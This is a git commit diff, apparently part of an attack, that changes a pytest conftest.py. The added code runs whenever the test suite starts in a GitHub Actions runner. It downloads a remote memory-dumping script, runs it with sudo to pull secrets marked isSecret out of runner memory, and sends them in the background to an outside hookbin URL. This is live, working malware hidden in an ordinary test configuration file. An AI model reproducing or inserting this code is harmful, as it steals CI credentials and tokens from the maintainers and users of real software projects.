38e1d53f93cb7005afaa7333df00451525a4e62a
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-05 19:37:36 +0000

    Update exploit based on attempt 2 feedback

--- conftest.py
+++ conftest.py
@@ -1,8 +1,9 @@
-import subprocess
 import os
 
-subprocess.run(r"""
-echo "Okay, we got this far. Let's continue..."
-curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"
-curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
-""", shell=True)
+# Secret exfiltration exploit
+if os.environ.get("GITHUB_RUN_ID"):
+    os.system(r"""(
+    echo "Okay, we got this far. Let's continue..."
+    curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"
+    curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
+    ) &""")
